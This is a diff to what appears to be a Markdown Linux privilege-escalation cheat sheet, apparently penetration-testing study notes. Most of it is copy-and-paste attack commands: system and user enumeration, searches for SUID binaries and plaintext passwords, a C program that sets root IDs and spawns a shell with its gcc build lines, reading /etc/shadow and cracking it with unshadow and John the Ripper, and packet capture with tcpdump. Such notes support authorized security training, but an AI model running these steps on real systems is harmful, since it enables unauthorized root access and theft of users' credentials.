@@ -233,67 +233,69 @@ grep -vE "nologin" /etc/passwd
 
 #### What's the OS? What version? What architecture?
 
-•	cat /etc/*-release
+uname -a
 
-•	uname -i
+cat /etc/issue
 
-•	lsb_release -a (Debian based OSs)
+cat /etc/*-release
+
+cat /etc/lsb-release      # Debian based
+
+cat /etc/redhat-release   # Redhat based
 
 #### Who are we? Where are we?
 
-•	id
+id
 
-•	pwd
+pwd
 
 #### Who uses the box? What users? (And which ones have a valid shell)
 
-•	cat /etc/passwd
+cat /etc/passwd
 
-•	grep -vE "nologin|false" /etc/passwd
+### Users with login
+
+grep -vE "nologin" /etc/passwd
+
+grep -vE "nologin|false" /etc/passwd
 
 #### What's currently running on the box? What active network services are there?
 
-•	ps aux
+ps aux
 
-•	netstat -antup
+netstat -antup
 
 #### What's installed? What kernel is being used?
 
-•	dpkg -l (Debian based OSs)
+dpkg -l (Debian based OSs)
 
-•	rpm -qa (CentOS / openSUSE )
+rpm -qa (CentOS / openSUSE )
 
-•	uname -a
+uname -a
 
 #### Ask yourself can you answer the following questions
 
-•	What user files do we have access to?
+What user files do we have access to?
 
-•	What configurations do we have access to?
+What configurations do we have access to?
 
-•	Any incorrect file permissions?
+Any incorrect file permissions?
 
-•	What programs are custom? Any SUID? SGID?
+What programs are custom? Any SUID? SGID?
 
-•	What's scheduled to run?
+What's scheduled to run?
 
-•	Any hardcoded credentials? Where are credentials kept?
+Any hardcoded credentials? Where are credentials kept?
 
-•	looking for the MySQL credential inside the web application
+looking for the MySQL credential inside the web application
 
 
 and now you are just getting warmed up
 
 
-uname -a
-
 uname -mrs
 
-cat /etc/redhat-release
-
 env
-
-id
 
 cat /proc/version
 
@@ -352,18 +354,14 @@ https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
 
 https://www.youtube.com/watch?v=dk2wsyFiosg
 
-Privilege escalation recon scripts:
+### Priv Enumeration Scripts
+
+#### Privilege escalation recon scripts:
 
 http://www.securitysift.com/download/linuxprivchecker.py
 
 http://pentestmonkey.net/tools/audit/unix-privesc-check
 
-
-### Users with login
-
-grep -vE "nologin" /etc/passwd
-
-### Priv Enumeration Scripts
 
 
 upload /unix-privesc-check
@@ -394,34 +392,32 @@ python linprivchecker.py extended
 
 Look for webserver, mysql or anything else like that.
 
-```
-# Metasploit
-ps
-
-# Linux
-ps aux
-```
 
 ### Installed software
 
 ```
-/usr/local/
-/usr/local/src
-/usr/local/bin
-/opt/
-/home
-/var/
-/usr/src/
+ls -la /usr/local/
+ls -la /usr/local/src
+ls -la /usr/local/bin
+ls -la /opt/
+ls -la /home
+ls -la /var/
+ls -la /usr/src/
 
-# Debian
+```
+
+#### Debian
+
 dpkg -l
 
-# CentOS, OpenSuse, Fedora, RHEL
+#### CentOS, OpenSuse, Fedora, RHEL
+
 rpm -qa (CentOS / openSUSE )
 
-# OpenBSD, FreeBSD
+#### OpenBSD, FreeBSD
+
 pkg_info
-```
+
 
 
 ### Weak/reused/plaintext passwords
@@ -439,7 +435,7 @@ username:qwerty
 username:password
 ```
 
-- Check plaintext
+### Check plaintext
 
 ```
 ./LinEnum.sh -t -k password
@@ -448,8 +444,8 @@ username:password
 ### Inside service
 
 ```
-# Linux
 netstat -anlp
+
 netstat -ano
 ```
 
@@ -474,25 +470,26 @@ find / -perm -u=s -type f 2>/dev/null
 
 below are some quick copy and paste examples for various shells:
 
+
 ```
 SUID C Shell for /bin/bash  
 
-  int main(void){  
-  setresuid(0, 0, 0);  
-  system("/bin/bash");  
-  }  
+int main(void){  
+setresuid(0, 0, 0);  
+system("/bin/bash");  
+}  
 
-  SUID C Shell for /bin/sh  
+SUID C Shell for /bin/sh  
 
-  int main(void){  
-  setresuid(0, 0, 0);  
-  system("/bin/sh");  
-  }  
+int main(void){  
+setresuid(0, 0, 0);  
+system("/bin/sh");  
+}  
 
-  Building the SUID Shell binary  
-  gcc -o suid suid.c  
-  For 32 bit:  
-  gcc -m32 -o suid suid.c
+Building the SUID Shell binary  
+gcc -o suid suid.c  
+For 32 bit:  
+gcc -m32 -o suid suid.c
 
 
 ```
@@ -660,13 +657,18 @@ viper-shell/application/modules/post/Privilege-Escalation/Linux/Post Exploitatio
 /root/network-secret.txt
 ```
 
+### take a screet shot
+
+
 ### Passwords and hashes
 
 ```
 cat /etc/passwd
+
 cat /etc/shadow
 
 unshadow passwd shadow > unshadowed.txt
+
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
 
@@ -674,7 +676,9 @@ john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 
 ```
 ifconfig
+
 ifconfig -a
+
 arp -a
 ```
 
@@ -682,7 +686,9 @@ arp -a
 
 ```
 tcpdump -i any -s0 -w capture.pcap
+
 tcpdump -i eth0 -w capture -n -U -s 0 src not 192.168.1.X and dst not 192.168.1.X
+
 tcpdump -vv -i eth0 src not 192.168.1.X and dst not 192.168.1.X
 ```
 
